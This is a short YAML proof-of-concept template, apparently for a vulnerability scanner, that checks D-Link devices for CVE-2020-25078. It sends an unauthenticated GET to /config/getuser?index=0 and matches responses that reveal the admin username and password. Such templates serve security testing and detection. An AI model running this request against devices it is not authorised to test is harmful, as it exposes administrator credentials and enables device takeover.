detail:
  author: kzaopa(https://github.com/kzaopa)
  links:
  - https://mp.weixin.qq.com/s/b7jyA5sylkDNauQbwZKvBg
expression: r0()
manual: true
name: poc-yaml-dlink-cve-2020-25078-account-disclosure
rules:
  r0:
    expression: response.status == 200 && response.headers["Content-Type"].contains("text/plain")
      && response.body.bcontains(b"name=admin") && response.body.bcontains(b"pass=")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /config/getuser?index=0
transport: http
